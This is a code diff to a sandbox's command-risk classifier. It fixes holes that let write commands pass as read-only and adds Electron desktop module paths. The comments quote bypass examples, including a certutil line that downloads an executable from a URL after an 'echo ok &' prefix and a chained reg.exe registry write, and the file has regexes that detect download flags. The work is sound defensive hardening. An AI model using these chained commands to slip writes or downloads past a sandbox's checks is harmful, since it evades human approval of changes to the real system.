@@ -113,20 +113,39 @@ export const WIN32_PACKAGE = '@deepseek-ai/dsh-win32-process'
  * 一个 node_modules 树。手动拼一堆候选路径会变成"环境漂移"（手册 #0.1）的反面教材，
  * 所以这里按 **DSH 实际加载路径** 顺序解析，并把最终来源记入报告供核对：
  *   1. 显式覆盖 DSH_SANDBOX_NODE_ROOT（可指向任意含 @deepseek-ai/* 的目录）
- *   2. 本模块自身的解析链（同树安装时命中）
- *   3. $DSH_PROFILE_DIR/node_modules（profile 级安装的 bundle）
- *   4. $DSH_PROFILE_DIR 的**上一层** node_modules —— pnpm workspace 的 hoisted 布局：
+ *   2. **桌面版（Electron）运行时** —— `<安装根>/resources/app.asar/dsh/node_modules`
+ *      （纯 JS 包）与 `<安装根>/resources/app.asar.unpacked/dsh/node_modules`（被解包的
+ *      原生模块）。桌面版的 DSH **不在** npm/npx 布局里：`process.execPath` 在 desktop
+ *      host 里就是 `<安装根>/<产品名>.exe`，从它推导是确定性的（不猜盘符、不扫目录）。
+ *      Electron 的 fs 与模块解析对 asar 路径透明：`existsSync` / `require` / `import`
+ *      都能命中 asar 内的包（本仓实测：`dsh-shell` / `dsh-fs` / `dsh-fs-local` /
+ *      `dsh-sandbox-windows-acl` / `dsh-win32-process` 五个包全部可从 asar 绝对路径导入，
+ *      且后两个是纯 JS —— 走 koffi FFI，asar 内没有 `.node`）。缺这一条 ⇒
+ *      桌面版里 `resolveDshModuleRoot()` 返回**空数组**（`tried:` 列表为空），
+ *      插件 fail-closed 报 `WINSTAGE_ENV_UNSUPPORTED`，且 `winstage-fs`/`winstage-shell`
+ *      两条 entry `failed to import` ⇒ `fs`/`shell` 无提供方 ⇒ `sessionController` 等
+ *      全部 pending（实测症状：UI 报 `active Service "sessionController" is unavailable`）。
+ *   3. 本模块自身的解析链（同树安装时命中）
+ *   4. $DSH_PROFILE_DIR/node_modules（profile 级安装的 bundle）
+ *   5. $DSH_PROFILE_DIR 的**上一层** node_modules —— pnpm workspace 的 hoisted 布局：
  *      依赖装在 `$DSH_HOME/profiles/node_modules`，而 profile 目录自身往往只有
  *      `@local/*` 的 link、没有 `@deepseek-ai/*`（本仓实测：`profiles/web/node_modules`
  *      下五个包一个都不在，全在 `profiles/node_modules`）。缺这一条 ⇒ 第 3 条必然落空。
- *   5. dsh CLI 自身目录（`where dsh` / npm-cache 布局）
- *   6. dsh CLI 包内的 node_modules —— npm 全局安装把自身的 `@deepseek-ai/*` 依赖
+ *   6. dsh CLI 自身目录（`where dsh` / npm-cache 布局）
+ *   7. dsh CLI 包内的 node_modules —— npm 全局安装把自身的 `@deepseek-ai/*` 依赖
  *      **嵌套装**在包内（`<安装根>/node_modules/@deepseek-ai/dsh/node_modules`），
  *      并不提升到安装根；所以第 5 条在 npm 全局布局下同样落空。
  */
 export function resolveDshModuleRoot() {
   const candidates = []
   if (process.env.DSH_SANDBOX_NODE_ROOT) candidates.push(process.env.DSH_SANDBOX_NODE_ROOT)
+  // 桌面版（Electron）运行时：优先级仅次于显式覆盖（它是本机权威的 DSH 安装位置）。
+  // 只在 `resources/` 真实存在时才登记，避免在普通 node/npm 场景里塞进两条必然落空的候选。
+  const desktopResources = join(dirname(process.execPath), 'resources')
+  if (existsSync(desktopResources)) {
+    candidates.push(join(desktopResources, 'app.asar', 'dsh', 'node_modules'))
+    candidates.push(join(desktopResources, 'app.asar.unpacked', 'dsh', 'node_modules'))
+  }
   if (process.env.DSH_PROFILE_DIR) {
     candidates.push(join(process.env.DSH_PROFILE_DIR, 'node_modules'))
     // hoisted 布局：<profiles>/<name> 的上一层才是 workspace 的 node_modules
@@ -3879,7 +3898,9 @@ export const WRITE_OPERATORS = Object.freeze([
   { label: 'pipe-to-file-cmdlet', pattern: /\|\s*(out-file|set-content|add-content|export-csv|export-clixml|tee-object|tee)\b/i },
   { label: 'out-file', pattern: /\bout-file\b/i },
   { label: 'tee', pattern: /\btee(-object)?\b/i },
-  { label: 'curl-download-flag', pattern: /(^|\s)-[oO]\b/ },
+  // ★ 交叉验证：旧式样 `-[oO]\b` **匹配不到长选项** ⇒ `curl --output a.exe http://…`
+  //   与 `wget --output-document=a.exe …` 被判成"没有下载落盘动作"。补齐长选项形态。
+  { label: 'curl-download-flag', pattern: /(^|\s)--?(o|O|output|output-document|remote-name)\b/ },
   { label: 'git-mutating-subcommand', pattern: /\bgit(\.exe)?\s+(commit|push|pull|checkout|switch|reset|clean|apply|add|rm|mv|stash|merge|rebase|tag|init|clone|fetch)\b/i },
 ])
 
@@ -3901,6 +3922,40 @@ function tokenizeCommandLine(text) {
 
 export { tokenizeCommandLine }
 
+/**
+ * 命令分隔符（cmd 与 PowerShell 两侧的拼接写法）。
+ * PowerShell 常写成 `Get-Process; reg add …`（分号**贴在前一个 token 尾上**），
+ * 因此"以 `;` 结尾"也要算分隔符边界 —— 否则分号后那条命令会被整条吞掉。
+ */
+function isCommandSeparator(token) {
+  const text = String(token ?? '')
+  return /^[&|;]+$/.test(text) || /;$/.test(text)
+}
+
+/**
+ * 把"分隔符粘在别的 token 上"的形态劈开：`x;reg` → `['x', ';', 'reg']`。
+ *
+ * 只在**命令位扫描**这一步使用（不改变 `lowerTokens` 本身）：
+ * `WRITE_OPERATORS` 那组正则是对**原始拼接串**求值的，若在这里把整条命令行的
+ * token 都改写一遍，反而会动到既有判据的匹配面 —— 那是另一个失败模式。
+ *
+ * @param {string[]} tokens 已小写的 token 序列
+ * @returns {string[]} 分隔符独立成 token 的新序列
+ */
+export function splitCommandTokens(tokens) {
+  const out = []
+  for (const token of Array.isArray(tokens) ? tokens : []) {
+    const text = String(token ?? '')
+    if (text.length === 0) continue
+    const pieces = text.split(/([&|;]+)/)
+    for (const piece of pieces) {
+      if (piece === undefined || piece.length === 0) continue
+      out.push(piece)
+    }
+  }
+  return out
+}
+
 function baseNameLower(token) {
   const text = String(token ?? '').toLowerCase()
   const cut = Math.max(text.lastIndexOf('\\'), text.lastIndexOf('/'))
@@ -3920,6 +3975,12 @@ export function classifyCommandRisk(command, args = [], options = {}) {
   const joined = argv.map((v) => String(v)).join(' ')
   const tokens = tokenizeCommandLine(joined)
   const lowerTokens = tokens.map((t) => t.toLowerCase())
+  /**
+   * 分隔符**独立成 token** 的扫描序列（见 `splitCommandTokens` 的注释）。
+   * 只用于"按 token 匹配动词/命令位"的判定；`WRITE_OPERATORS` 那组正则仍对
+   * 原始 `joined` 求值（改写它反而会动到既有判据的匹配面）。
+   */
+  const scannedTokens = splitCommandTokens(lowerTokens)
   const reasons = []
 
   // ① 写入型操作符（重定向 / 落盘管道 / 下载落盘 / git 变更子命令）
@@ -3929,9 +3990,17 @@ export function classifyCommandRisk(command, args = [], options = {}) {
       reasons.push(`写入型操作符「${operator.label}」命中：${JSON.stringify(hit[0]).slice(0, 40)}`)
     }
   }
-  // ② 写类动词 / 别名
-  const writeHits = lowerTokens.filter((t) => WRITE_VERBS.includes(t))
-  if (writeHits.length > 0) reasons.push(`写类动词命中：${[...new Set(writeHits)].join(', ')}`)
+  // ② 写类动词 / 别名（在**分隔符已劈开**的 `scannedTokens` 上判，理由见 ③c）
+  //
+  // ★ 缺陷（交叉验证实测）：旧写法只做 `WRITE_VERBS.includes(t)` 的**全等**匹配，
+  //   于是 `C:\Windows\System32\reg.exe`、`.\\reg.exe` 这类**带目录**的写法一个都命中不了
+  //   （`WRITE_VERBS` 里存的是裸名 `reg` / `reg.exe`）。后果：
+  //     `echo "ok & C:\Windows\System32\reg.exe add HKCU\X"` 一路走到 :4089 判成 READ_ONLY，
+  //     而 `assertStagingWriteEnforceable()` 对 READ_ONLY 是 `bypassed:'read-only'` **一票放行**；
+  //     降级档没有 shim ⇒ 这条注册表写**直落真实 hive**，既不暂存也不审批。
+  //   修法：同一个 token 再用 `baseNameLower()` 比一次（目录前缀不该改变它的语义）。
+  const writeHits = scannedTokens.filter((t) => WRITE_VERBS.includes(t) || WRITE_VERBS.includes(baseNameLower(t)))
+  if (writeHits.length > 0) reasons.push(`写类动词命中：${[...new Set(writeHits.map((t) => baseNameLower(t)))].join(', ')}`)
   // ③ 未知 Verb-Noun：写前缀 ⇒ 有风险；读前缀但不在只读表里 ⇒ 判不出来
   //    （前缀不是真实 PowerShell 动词的连字符单词只是普通参数，比如 `still-alive`）
   const unknownVerbNoun = []
@@ -3967,6 +4036,53 @@ export function classifyCommandRisk(command, args = [], options = {}) {
           `它既不在只读表里，也不在写表里 —— 判不出来时拒绝，且如实说明判不出来的原因`,
       ],
       evidence: { command: String(command ?? ''), tokens: lowerTokens },
+    }
+  }
+  // ③c ★ 交叉验证发现的放行洞（P0）：**命令位上的未知程序**必须判不出来。
+  //
+  //   现场形状：`echo ok & certutil -urlcache -f http://x/a.exe C:\tmp\a.exe`
+  //     · ① 写入型操作符：没命中（`certutil` 的落盘靠 `-f`/URL 参数，不在表里）；
+  //     · ② 写类动词：`certutil` / `wmic` / `mshta` / `rundll32` / `regedit` 都不在表内；
+  //     · ④ 首 token `echo` 是**已知只读** ⇒ 走到 :4044 仅凭 `readOnlyHitCount > 0`
+  //       判成 READ_ONLY ⇒ 降级档里 `assertStagingWriteEnforceable()` 按
+  //       `bypassed:'read-only'` **一票放行**；而降级档没有 shim ⇒ **直写真实磁盘**。
+  //
+  //   修法：命令位（分隔符之后的第一个 token）上出现"既不只读也不在写表"的程序名时
+  //   判 INDETERMINATE —— 与 :4010 "判不出来时拒绝"同一口径。
+  //   判据**只认命令位**，因此 `cmd /c echo hello` 的 `hello` 这类实参不会被误伤。
+  const unknownCommandTokens = []
+  /**
+   * ★ 缺陷（交叉验证实测）：分隔符**贴在前一个 token 尾上**时整条命令被吞掉。
+   *
+   * `isCommandSeparator()` 只认"整个 token 就是分隔符"或"以 `;` 结尾"，
+   * 而 PowerShell/cmd 里 `Get-Process;reg add …`、`echo x;reg add …`、
+   * `echo x&&reg add …` 的切分结果是 `x;reg` / `x&&reg` —— 既不是分隔符、
+   * 也不在任何表里 ⇒ 后续那一条**写命令根本没有命令位**，判定只看首 token `echo`
+   * ⇒ READ_ONLY ⇒ 降级档直写真实盘。
+   *
+   * 修法：扫描前先把分隔符从 token 里**劈出来**（`splitCommandTokens`），
+   * 让 `x;reg` 变成 `x` + `;` + `reg`，命令位判定才对得上真实语义。
+   */
+  for (let i = 1; i < scannedTokens.length; i += 1) {
+    if (!isCommandSeparator(scannedTokens[i - 1])) continue
+    const raw = scannedTokens[i]
+    if (isCommandSeparator(raw)) continue
+    if (raw.startsWith('-') || raw.startsWith('/')) continue
+    // 命令位上的**程序名**：目录前缀不改变语义 ⇒ 先取基名再判定
+    const token = baseNameLower(raw)
+    if (!/^[a-z0-9_][a-z0-9_.\-]*$/.test(token)) continue
+    if (READ_ONLY_VERBS.includes(token) || READ_ONLY_EXES.includes(token)) continue
+    if (WRITE_VERBS.includes(token) || INTERPRETER_COMMANDS.includes(token)) continue
+    unknownCommandTokens.push(token)
+  }
+  if (unknownCommandTokens.length > 0) {
+    return {
+      risk: COMMAND_RISK.INDETERMINATE,
+      reasons: [
+        `无法判定副作用：命令位上出现未登记的程序 ${[...new Set(unknownCommandTokens)].join(', ')}` +
+          `（既不在只读表也不在写表内）；首 token 的"只读"不能洗白后续载荷 —— 判不出来时拒绝`,
+      ],
+      evidence: { command: String(command ?? ''), unknownCommandTokens, tokens: lowerTokens },
     }
   }
   // ③b 载荷读不懂（base64 / 脚本文件）⇒ indeterminate，绝不按只读放行
